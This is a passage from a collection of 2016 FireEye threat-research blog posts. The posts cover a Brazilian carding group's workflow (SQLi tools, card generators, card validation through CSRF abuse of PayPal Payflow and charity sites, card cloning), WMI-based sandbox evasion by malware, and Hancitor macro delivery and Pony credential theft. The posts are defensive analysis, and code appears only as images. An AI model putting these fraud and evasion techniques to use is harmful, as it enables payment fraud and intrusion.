  shops,&quot; allow customers to use a web-based platform to sort
  through thousands or millions of individual pieces of card data and
  purchase as much or as little as they want. The shops provide
  customers with filters to select the individual pieces of card data
  they wish to purchase and add to their carts for checkout, similar to
  legitimate sites. The same types of shops also allow malicious actors
  to steal credentials stolen from other services such as email
  providers, online bill payment websites, entertainment services, or
  travel booking websites.</p>
 <p>These actors scan websites for vulnerabilities to exploit to
  illicitly access databases. They most commonly target Brazilian
  merchants, though others use the same tactics to exploit entities
  outside Brazil. One simple method the group uses is Google Dorks,
  advanced Google searches used to identify security loopholes on
  Google-indexed websites. An example is shown in Figure 3.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Brazilian%20Carding%20Taha%20Karim/Fig4.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 3: Example of Portuguese-language Google
    Dork used in exploitation</span>
  <i></i></p>
 <p>The group also uses the SQL injection (SQLi) tools &quot;Havij
  Advanced SQL Injection Tool&quot; and &quot;SQLi Dumper version
  7.0&quot; (Figure 4) to scan for and exploit vulnerabilities in
  targeted eCommerce sites. Of note, these tools can dump whole
  databases from targeted victims.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Brazilian%20Carding%20Taha%20Karim/Fig5.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 4: SQLi Dumper v7.0</span></p>
 <p>This group has also shown interest in modifying point-of-sale (POS)
  terminals to harvest magnetic stripe and EMV chip data.</p>
 <p>
  <i>&quot;Toy Store&quot;</i></p>
 <p>FireEye Labs identified &quot;Toy Store&quot; as one of the card
  shops frequently used by the group. It appears that this card shop has
  operated since November 2015. Despite the fact that the website has
  been taken down multiple times (most recently in July 2016), it keeps
  operating, sometimes with newly registered domains.</p>
 <p>The store offers a large amount of dumps from multiple sellers. The
  sold credentials are associated with payment cards of various types,
  issued by variety of financial institutions from multiple countries.
  At least eight sellers update the website as frequently as daily,
  offering newly obtained databases from the U.S.</p>
 <p>Examination of dumps uploaded between May 2016 and July 2016
  revealed that one vendor uploaded 1,900 credit cards issued by
  Brazilian banks. Further examination shows sellers uploading dumps
  regularly from the same locations. In Table 1, seller &quot;X&quot;
  uploaded the listed data during the first two weeks of August 2016.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Brazilian%20Carding%20Taha%20Karim/Tab1.png"" /></p>
 <p>
  <span class=""type-XS"">Table 1: Data advertised by one &quot;Toy
    Store&quot; vendor</span></p>
 <p>This seller uploads dumps exclusively from either Texas or Florida.
  Some base names they provide even contain the word &quot;POS,&quot;
  with a validity rate of 90 percent. This suggests that ATM skimming
  devices or malware are probably installed in these locations.</p>
 <p>The shop allows users to make bulk purchases for any U.S. state,
  ranging from packages of 30 to 500 units with prices ranging from $250
  to $1,000 per bulk.</p>
 <p>Registration is free and the only payment method accepted is
  Bitcoin. A unique Bitcoin payment address is generated per user.</p>
 <p>Finally, the website has checker functionality – charging $0.50 per
  check – that allows users to quickly check for credit card validity
  and ask for a refund if a purchased card is not valid (Figure 5).</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Brazilian%20Carding%20Taha%20Karim/Fig6.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 5: Toy Store shop site</span></p>
 <h4>Phase 3: Generating Further Card Numbers</h4>
 <p>Once in possession of compromised payment card credentials, these
  actors use tools commonly known as &quot;card generators&quot; to
  generate new card numbers based on the compromised ones, creating
  additional opportunities for monetization. These tools require as
  input a valid 16-digit credit card number, expiration date, and a file
  name to store the new cards generated. Examples of such tools commonly
  used by Brazilian carders include &quot;WZP&quot; (Figure 6) and
  &quot;Gerador CC&quot; (Figure 7).</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Brazilian%20Carding%20Taha%20Karim/Fig7.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 6: &quot;WZP&quot; card generator</span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Brazilian%20Carding%20Taha%20Karim/Fig8.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 7: &quot;Gerador CC&quot; card generator</span></p>
 <p>&quot;Gerador CC&quot; generates credit card numbers based on the
  Bank Identifier Number (BIN), with a fixed expiration date and CVV
  equal to 000. Typically, 1,000 cards will be generated per round. Then
  threat actors use public websites set up to check if the credit card
  number is valid. However, the fact that the card number generated is
  valid does not necessarily mean the card can be used for real
  purchases at any website. This method of generating card data cannot
  determine what validation information (e.g., expiration date) or
  personal information should be associated with the card numbers. So,
  to make purchases with the data, actors have to find websites with
  vulnerable authentication systems.<br /> </p>
 <h4>Phase 4: Validating New Card Numbers</h4>
 <p>After stealing, buying, or generating card data, the group validates
  it through multiple tools and services available in underground communities.</p>
 <p>Vulnerable merchant websites – websites that accept payments with
  generated or compromised payment cards – are identified and used
  regularly by carders. For example, in March 2016, we observed an
  advertisement in an underground community for a list that contained
  the addresses of 10,000 vulnerable merchant websites. Criminals take
  advantage of these sites to not only make purchases, but also to
  bulk-check card data for usability.</p>
 <p>One bulk card-checking tool this group uses is &quot;Testador
  Amazon.com v1.1&quot; (Figure 8). Despite its name, this tool does not
  use Amazon’s website, but exploits an unauthenticated Cross-Site
  Request Forgery (CSRF) vulnerability of a merchant website allowing
  the abuse of PayPal Payflow link functionality (Figure 9).</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Brazilian%20Carding%20Taha%20Karim/Fig9.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 8: Testador Amazon v1.1 GUI</span></p>
 <p>
  <b>
    <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Brazilian%20Carding%20Taha%20Karim/Fig10.png"" /></b></p>
 <p>
  <span class=""type-XS"">Figure 9: PayPal Payflow Link page</span>
  <i></i></p>
 <p>A Payflow Link is a PayPal-hosted payment solution that allows
  merchant websites to securely connect their customers to PayPal's
  secure server and use it to automate order acceptance, authorization,
  processing, and transaction management, making it useful for carders
  to check the validity of credit card numbers. Payflow links cannot be
  accessed directly, but only from trusted and authenticated merchants.
  &quot;Testador Amazon&quot; abuses legitimate merchant sites to submit
  unauthenticated valid orders, providing access to a legacy PayPal
  Payflow Link. At this point, actors can test the generated credit card
  numbers by filling the input field of the form automatically via the
  tool. This tool then continues submitting thousands of valid orders,
  simultaneously checking for the validity of the next credit card
  number in the list.</p>
 <p>The actors use a dedicated IRC channel provided by the eCrime
  community service &quot;ChkNet&quot; (Figure 10) to validate credit
  cards. Based on our observations of interactions in this channel,
  between May 2016 and June 2016, malicious actors validated 2,987 cards
  from 62 countries, with the most coming from the U.S. (nearly half),
  Brazil, and France. The actors in the channel share instructions on
  validation and advice on maintaining anonymity during these
  operations. The channel is accessible without registration; however,
  actors interested in using the IRC bot to verify the validity of
  credit cards are charged 0.003 BTC ($1.88 USD).</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Brazilian%20Carding%20Taha%20Karim/Fig11.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 10: ChkNet IRC service activation</span>
  <i></i></p>
 <p>Another validation method involves using online charity donations.
  ChkNet also provides an API and a software tool named “Checker” that
  leverages charity websites for this purpose. This type of exploitation
  of charities is popular in the Brazilian eCrime community. Figure 11
  shows a credit card tested by Checker. The Status “Live” means the
  card was successfully used during an online payment transaction.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Brazilian%20Carding%20Taha%20Karim/Fig12.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 11: Checker credit card validation result</span>
  <i></i>
  <b></b></p>
 <h4>Phase 5: Laundering and Monetization</h4>
 <p>We observed this group using multiple tactics to monetize the card
  data it steals and generates.</p>
 <p>The actors frequently use the stolen data to create cloned physical
  cards, which they use to attempt to withdraw funds from ATMs. The
  group has performed these activities at multiple locations across
  Brazil, possibly using multiple mules. The group primarily uses the
  MSR 606 Software (Figure 12) and Hardware (Figure 13) to create cloned cards.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Brazilian%20Carding%20Taha%20Karim/Fig13.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 12: MSR606 software</span>
  <i></i></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Brazilian%20Carding%20Taha%20Karim/Fig14.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 13: MSR606 Magnetic Stripe card reader/writer</span>
  <i></i></p>
 <p>Additionally, we observed the group exploiting popular eCommerce
  sites to perform fraudulent transactions. This monetization tactic
  requires the group to constantly refine its tactics to deal with
  measures put in place to validate that card and cardholder data is
  legitimate and other anti-fraud checks. Carders in the community with
  whom this group interacts regularly share recommendations based on
  this experience, such as using virtual private networks, limiting the
  number of items purchased at a time, and cleaning machines used to
  make purchases of any profiling information such as cookies.</p>
 <p>Whether this group uses any further means to launder the proceeds
  from these activities is unclear. However, Brazilian actors commonly
  use several methods to do so, such as reselling cards they have
  created, paying bills with stolen cards in return for a portion of the
  bill's value and reselling illicitly obtained goods.</p>
 <h4>
  <b>Outlook</b></h4>
 <p>Payment card fraud has been extremely profitable for malicious
  actors for years. Given its profitability and actors' investment in
  this type of fraud, we see no indication of actors moving away from
  this type of activity for the foreseeable future. As security measures
  continue to evolve to counter this area of fraud, we will likely see
  actors attempting to devise new schemes to maintain the profits they
  are obtaining and continue capitalizing on their investments in this area.</p>
 <p>
  <i>This material was originally posted to the FireEye iSIGHT
    Intelligence MySIGHT Portal on Oct. 7, 2016. The FireEye iSIGHT
    Intelligence MySIGHT Portal contains additional information based on
    our investigations of a variety of topics discussed in this post,
    including Joker’s Stash, ChkNet, virtual currencies, and
    point-of-sale systems. Click </i>
  <a href=""https://www.fireeye.com/products/isight-intelligence.html""><i>here</i></a>
  <i> for more information.</i></p>",http://www.fireeye.com/blog/threat-research/2016/10/operations_of_a_braz1.html
Increased Use of WMI for Environment Detection and Evasion,"<h4>
  <b>Introduction</b></h4>
 <p>Throughout the past few months, FireEye Labs has observed an
  increased use of Windows Management Instrumentation (WMI) queries for
  environment detection and evasion of dynamic analysis and
  virtualization engines. WMI provides high-level interaction with
  Windows objects using C/C++, VBScript, JScript, C#, and more in the
  form of WMI Query Language (WQL). Last year, FireEye published a <a href=""https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf"">white
  paper</a> detailing an in-depth analysis of WMI infrastructure and
  potential abuse of WMI services by malware writers.</p>
 <p>In this post we will present an analysis of some samples found in
  the wild in 2016. For the purposes of this blog post, we will focus on
  evasion only, ignoring other malicious aspects of the samples.</p>
 <h4>
  <b>Evasion after Anti-Virus Detection</b></h4>
 <p>Anti-virus can be detected by a WMI query as they are registered in <b>
    <i>AntiVirusProduct </i></b>class under <b>
    <i>root\SecurityCenter2 </i></b>(root\SecurityCenter before Vista)
  namespace. We analyzed a sample that checked the operating system from <b>
    <i>Win32_OperatingSystem</i></b> class under <b>
    <i>root\cimv2</i></b> namespace first and if the OS version was
  above 6 (Windows Vista and above), then anti-virus check was
  performed. Figure 1 shows the VBScript code of anti-virus check.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Increased%20WMI%20Muhammad%20Hasib%20Latif/WMI%20updated%20figures/Fig1.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 1: Anti-virus product checks in VBScript
    code using WMI query</span></p>
 <p>Anti-virus and other user information is sent to the server for
  fetching the right payload or performing evasion, as shown in Figure 2.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Increased%20WMI%20Muhammad%20Hasib%20Latif/WMI%20updated%20figures/Fig2.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 2: Anti-virus and other info being sent
    to the server and actions against response</span></p>
 <h4>
  <b>Virtualization Detection and Evasions</b></h4>
 <p>One of the samples was found to monitor many security products using
  different techniques, but most popular virtualization software (such
  as VMware and VirtualBox) were being detected using WMI queries. It
  retrieves BIOS information from <b>
    <i>Win32_BIOS</i></b> class under <b>
    <i>root\cimv2</i></b> namespace. Specific fields/columns can also be
  retrieved similar to an SQL query. The following queries were found in
  this sample binary (Figure 3).</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Increased%20WMI%20Muhammad%20Hasib%20Latif/WMI%20updated%20figures/Fig3.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 3: Virtualization software checks by the
    malware using WMI queries</span></p>
 <p>The query yields the following result when executed in PowerShell in
  Bochs Emulator, as shown in Figure 4.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Increased%20WMI%20Muhammad%20Hasib%20Latif/WMI%20updated%20figures/Fig4.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 4: Query result in PowerShell in Bochs Emulator</span></p>
 <p>Figure 5 shows the full scale environment detection being performed
  by this sample. Other services may be checked by enumerating the
  running processes or using Windows Registry.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Increased%20WMI%20Muhammad%20Hasib%20Latif/WMI%20updated%20figures/Fig5.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 5: Security products being monitored by
    the malware</span></p>
 <p>Another sample used <b>
    <i>Win32_ComputerSystem</i></b> class for virtual machines
  detection, as show in Figure 6.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Increased%20WMI%20Muhammad%20Hasib%20Latif/WMI%20updated%20figures/Fig6.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 6: ComputerSystem WMI query found in the sample</span></p>
 <p>The result of the query (Figure 9) has ’Model’ field (Figure 7),
  which holds the virtual machine information in case of VMware,
  VirtualBox and Virtual Machine.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Increased%20WMI%20Muhammad%20Hasib%20Latif/WMI%20updated%20figures/Fig7.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 7: Model column retrieval</span></p>
 <p>When any of the three strings matched with ‘<i>Model’ </i>field
  output, virtualization gets detected by matching the stored value with
  the one created in the process, as evident in Figure 8.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Increased%20WMI%20Muhammad%20Hasib%20Latif/WMI%20updated%20figures/Fig8.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 8: VirtualBox, VMware and Virtual Machine checks</span></p>
 <p>When the aforementioned query was executed in PowerShell in VMware
  workstation 12.0, it gave the result illustrated in Figure 9.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Increased%20WMI%20Muhammad%20Hasib%20Latif/WMI%20updated%20figures/Fig9.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 9: Query result in PowerShell 2.0</span></p>
 <p>Another sample has used <b>Win32_DiskDrive</b> to detect Virtual Box
  (Figure 10), Virtual Hard disk (Figure 11) and VMware (Figure 12).
  When any of the virtual machines get detected, the process terminates
  itself, evading the behavioral analysis.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Increased%20WMI%20Muhammad%20Hasib%20Latif/WMI%20updated%20figures/Fig10.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 10: VirtualBox detection</span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Increased%20WMI%20Muhammad%20Hasib%20Latif/WMI%20updated%20figures/Fig11.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 11: Virtual Hard disk detection</span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Increased%20WMI%20Muhammad%20Hasib%20Latif/WMI%20updated%20figures/Fig12.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 12: VMware detection</span></p>
 <h4>
  <b>Process Detection</b></h4>
 <p>We analyzed a sample that not only checked a specific process from <b>
    <i>Win32_Process</i></b> class under namespace <b>
    <i>root\cimv2</i></b>, but also killed it. Immunity debugger, a
  well-known debugger, is terminated and its folder is deleted after
  changing permissions using Windows Script Host shell, as evident in
  the code in Figure 13.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Increased%20WMI%20Muhammad%20Hasib%20Latif/WMI%20updated%20figures/Fig13.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 13: Immunity debugger being terminated
    and folder being deleted</span></p>
 <p>Moreover, anti-virus vendor Kingsoft Corporation’s processes are
  also forced to stop execution, meaning its anti-virus processes are
  being killed. The code is shown in Figure 14. Usually samples use
  CreateToolHelp32Snapshot, Process32First and Process32Next APIs for
  finding a process, but here it is evident that <b>
    <u>one WMI query comes in handy to replace tens of lines of code.</u></b></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Increased%20WMI%20Muhammad%20Hasib%20Latif/WMI%20updated%20figures/Fig14.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 14: Code designed to kill processes
    associated with Kingsoft (an anti-virus product company)</span></p>
 <h4>
  <b>Windows Services Detection</b></h4>
 <p>Another sample, an MS Office key generator, checked Windows Office
  Software Protection Service through WMI queries (Figure 15). This
  service enables software vendors to enforce <a href=""https://msdn.microsoft.com/en-us/library/bb931699.aspx"">secure
  licensing</a> on the client machines. If this service is not running,
  it is started as shown in Figure 16. Once the Office Software
  Protection Service object is retrieved, it is then used to install MS
  Office product key.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Increased%20WMI%20Muhammad%20Hasib%20Latif/WMI%20updated%20figures/Fig15.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 15: OfficeSoftwareProtectionService check
    using WMI query</span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Increased%20WMI%20Muhammad%20Hasib%20Latif/WMI%20updated%20figures/Fig16.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 16: Code to start/restart OfficeSoftwareProtectionService</span></p>
 <h4>
  <b>Summary</b></h4>
 <p>During analysis and research, it has been observed that WMI queries,
  shown in Figure 17, can be used for environment detection and (with
  more details) for evasion as well. There may be more queries that are
  not listed here, but we suggest security researchers should at least
  monitor these queries for evaluating the samples.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Increased%20WMI%20Muhammad%20Hasib%20Latif/WMI%20updated%20figures/Fig17.jpeg"" /></p>
 <p>
  <span class=""type-XS"">Figure 17: Possible WMI queries for environment detection/evasion</span></p>
 <h4>
  <b>Conclusion</b></h4>
 <p>Malware writers are always in search of new ways to evade analysis
  frameworks and sandboxes in order to make the payload execution
  successful in their targeted environments and platforms. WMI provides
  a simple way of environment detection that can be used to evade
  sandboxes and dynamic analysis tools, which seems to be underestimated
  by reverse engineers and others in the security community. Mitigation
  Steps should be taken to monitor WMI queries that could lead to
  possible evasion.       </p>
 <h4>
  <b>Acknowledgements</b></h4>
 <p>We would like to thank Matthew Dunwoody for his valuable input.
  Moreover, we are also grateful to Muhammad Umer Khan and Imran Khan
  for their continuous support in providing relevant sample sets and
  validation effort.</p>",http://www.fireeye.com/blog/threat-research/2016/10/increased_use_ofwmi.html
"Vendetta Brothers, Inc. – A Window Into the Business of the
Cybercriminal Underground","<p>FireEye iSIGHT Intelligence has been tracking a pair of
  cybercriminals that we refer to as the “Vendetta Brothers.” This
  enterprising duo uses various strategies to compromise point-of-sale
  systems, steal payment card information and sell it on their
  underground marketplace “Vendetta World.”</p>
 <br />
 <p>The Vendetta Brothers – who we believe operate from Spain and
  Eastern Europe – have been observed using everything from phishing to
  installing physical skimmers to steal payment card data, and their
  targets have mostly been located in the U.S. and Nordic countries.</p>
 <p>Our latest report shines light on the Vendetta Brothers’ tactics,
  techniques and procedures, which involve the use of practices more
  commonly seen in legitimate business, including outsourcing,
  partnerships, diversifying their market, and insulating liability.</p>
 <p>We expect to see other cybercriminal groups using these more
  advanced techniques as a way of scaling their operations and
  increasing profits, all while mitigating risk and potentially
  frustrating investigators.</p>
 <p>
  <a href=""https://www.fireeye.com/content/dam/fireeye-www/current-threats/pdfs/rpt-vendetta-bros.pdf"" target=""_blank"">Download the report to learn more about the Vendetta Brothers</a>.</p>",http://www.fireeye.com/blog/threat-research/2016/09/vendetta_brothersi.html
Hancitor (AKA Chanitor) observed using multiple attack approaches,"<p>Many threat actors use multiple attack vectors to ensure success. The
  individuals using Hancitor malware (also known by the name Chanitor)
  are no exception and have taken three approaches to deliver the
  malware in order to ultimately steal data from their victims. These
  techniques include uncommon API abuse and PowerShell methods.</p>
 <p>We recently observed Hancitor attacks against some of our FireEye
  Exploit Guard customers. The malicious document used to deliver the
  Hancitor executable was observed being distributed as an attachment in
  email spam. Once downloaded and executed, it drops an intermediate
  payload that further downloads a Pony DLL and Vawtrak executable,
  which perform data theft and connect to a command and control (C2) server.</p>
 <h5>Stage 1: Email Delivery</h5>
 <p>We observed a number of phishing emails that reference an invoice,
  as seen in Figure 1. The attachment in these emails is a weaponized
  Microsoft Office document containing a malicious macro that – when
  enabled – leads to the download of Hancitor.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Hancitor%20Ankit/Fig1.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 1:  Email with a malicious document attached</span></p>
 <h5>Stage 2: Macro and Luring Mechanism</h5>
 <p>Upon opening the attachment, a typical luring mechanism is employed
  instructing the victim to enable macros, as seen in Figure 2. FireEye
  has observed the attackers behind this campaign using three different approaches.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Hancitor%20Ankit/Fig2.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 2:  Luring the victim to enable macros</span></p>
 <h5>First Approach</h5>
 <p>Unlike other malicious macros, this one is not using APIs directly
  to run the payload. Macros can call APIs directly, but normally are
  not supposed to run shellcode. The macro used to deliver Hancitor
  calls the native Windows API, “CallWindowProc”, which can be used to
  interpret and execute shellcode, as depicted in Figure 3.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Hancitor%20Ankit/Fig3.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 3:  Code within the macro that uses the
    CallWindowProc API to execute shellcode</span></p>
 <h5>Second Approach</h5>
 <p>Recently, FireEye Exploit Guard captured Hancitor samples that
  leverage a new API Callback function. In addition to “CallWindowProc”,
  Hancitor samples may use the function EnumResourceTypesA to interpret
  and execute shellcode, as seen in Figure 4.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Hancitor%20Ankit/Fig4.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 4:  EnumResourceTypesA API declaration</span></p>
 <h5>Third Approach</h5>
 <p>We also observed a third approach used by a malicious document file
  to deliver Hancitor. Although the threat actor and command and control
  servers are similar to the second Hancitor delivery approach, this one
  uses an alternate tactic to reach its goal of data theft.</p>
 <p>With this approach, the luring message shown in the Figure 2 now
  serves another purpose. Not only does it lure the victim into enabling
  the macros, but it also is assigned an alternate text: “fkwarning”, as
  seen in Figure 5. The macro has code to check this attribute to make
  sure the luring message shape object is present. If this object is not
  found, the macro will exit without downloading additional payloads.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Hancitor%20Ankit/Fig5.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 5:  Code to ensure that the luring
    message is intact and the malicious document is executed for the
    first time</span></p>
 <p>Even if it finds the luring message, it will run the macro once and
  will delete the shape so that the macro will never be executed again,
  as seen in Figure 6.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Hancitor%20Ankit/Fig6.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 6: Code to delete the shape that includes
    the lure message</span></p>
 <p>The malicious macro replaces the deleted image with another that
  displays the text “network error” to reduce user suspicions, as shown
  in Figure 7. Note that text is always present in the malicious macro,
  but it will only be made visible by the macro when it is executing for
  the first time.<br /> <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Hancitor%20Ankit/Fig7.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 7: The hidden text that becomes visible
    once the macro is executed for the first time</span></p>
 <p>The macro then combines fragments of code to make a PowerShell
  command. However, unlike in the other approaches, the malicious code
  is not hidden in the code or form or metadata. We observed that the
  malware extracts malicious code fragments from within the
  section_header of the embedded image and combines them into a
  PowerShell command on the fly, as seen in Figure 8. This technique
  will evade some basic static methods of detection applied to macros
  macro forms.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Hancitor%20Ankit/Fig8.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 8:  PowerShell command observed in header
    after increasing font size</span></p>
 <p>The malware authors have taken a very simple but interesting
  approach to obscure the PowerShell command text. The font size is set
  to microscopic level 1, as seen in Figure 9. This reduces the
  likelihood that a casual observer will notice something unusual.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Hancitor%20Ankit/Fig9.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 9:  Minimal font size to hide content of header</span></p>
 <p>Using the “DownloadFile” method, PowerShell obtains a payload from
  an attacker-controlled website in a ZIP archive format. PowerShell
  uses the “copyhere” function to unzip the payload. The “.Item”
  attribute is also set to “16”, which ignores all warnings, as seen in
  Figure 10.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Hancitor%20Ankit/Fig10.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 10: Code to download archived payload and
    unzip it</span></p>
 <p>Once the downloaded executable is extracted from the ZIP archive,
  the macro code deletes the archive using the “Kill” function, as seen
  in Figure 11. After the executable is executed, it downloads Pony and
  Vawtrak malware variants to steal data.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Hancitor%20Ankit/Fig11.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 11:  Code to delete the archive</span></p>
 <h5>Different Approaches, Same Hancitor</h5>
 <p>Although there are differences between the second and third
  approaches to distributing Hancitor, the objective of the threat actor
  is the same, as we found the same command and control server being
  used in both approaches.</p>
 <p>However, we can see a minor change in the second Hancitor approach
  command and control servers when compared to the first Hancitor
  approach command and control servers, with URLs ending with
  ls5/gate.php instead of ls4/gate.php, as seen in Figure 12.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Hancitor%20Ankit/Fig12.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 12: Earlier and newer Hancitor gates</span></p>
 <h5>Stage 3: First stage payload</h5>
 <p>The file copies itself to “%system32%” and creates a registry run
  key entry for persistence. Upon execution, it will communicate with an
  attacker-controller website to download a variant of the Pony malware,
  “pm.dll” along with a standard Vawtrak trojan.</p>
 <h5>Stage 4: Second stage payload Pony data exfiltration capabilities</h5>
 <p>We observed a number of data theft capabilities in the second stage
  Pony variant, including:</p>
 <p>1) Stealing autocomplete Intelliforms data, which may include user
  passwords, as seen in Figure 13.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Hancitor%20Ankit/Fig13.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 13: Stealing the content of the
    Intelliforms registry key</span></p>
 <p>2) The unique GUID seen in Figure 14 helps to decrypt credentials
  from credential store. There is a good amount of documentation on
  various forums on how to use this salted value to access credentials.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Hancitor%20Ankit/Fig14.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 14: Credential stealing</span></p>
 <p>3) Accessing Mozilla saved passwords from “signons.txt,” as seen in
  Figure 15.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Hancitor%20Ankit/Fig15.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 15: Accessing Mozilla saved passwords</span></p>
 <p>4) Figure 16 shows the malware code related to theft via accessing
  Microsoft OMI Email configuration information. We can also see
  registry entries related to storing Outlook Profile, which contains
  information about where emails and other data is stored being accessed.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Hancitor%20Ankit/Fig16.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 16:  Malware code for Outlook data theft
    via registry access</span></p>
 <h5>Conclusion</h5>
 <p>The malware authors responsible for Hancitor have developed several
  capabilities within malicious macros that support malware installation
  and data theft. These capabilities include leveraging uncommon APIs
  and obscuring malicious PowerShell commands, tactics that made
  detection more challenging.<br /> <br /> FireEye Exploit Guard
  provides organizations with the ability to detect malicious shellcode
  in the initial phase of the attack lifecycle, regardless of these
  evasion techniques.<br /> <br /> FireEye recommends that organizations
  block macros in Microsoft Office documents that originate from the
  Internet by Group Policy. In all cases, users should be cautious about
  enabling macros and should practice vigilance about opening email
  messages from untrusted sources.</p>",http://www.fireeye.com/blog/threat-research/2016/09/hancitor_aka_chanit.html
Announcing the Third Annual Flare-On Challenge,"<p>
  <img class=""float-left"" src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Flare%20on%20challenge%20nick%20harbour/flareon%20challenge%20logo.jpg"" />Let fall be the season for reverse engineering!
  On Sept. 23, 2016, the FireEye Labs Advanced Reverse Engineering
  (FLARE) team will be hosting its third annual Flare-On reverse
  engineering contest with a designated start time of 8pm ET. This is a
  CTF-style challenge for all active and aspiring reverse engineers,
  malware analysts and security professionals. The contest will run for
  six full weeks, ending Nov. 4, 2016, at 8pm ET.</p>
 <p>A total of 10 exquisitely crafted challenges stand between you and a
  famed prize that serves as a badge of honor. The progressively
  challenging binaries will cover a variety of software platforms and
  puzzle techniques. The challenge runs the gamut of skills we believe
  are necessary to succeed on the FLARE team. The contest is designed
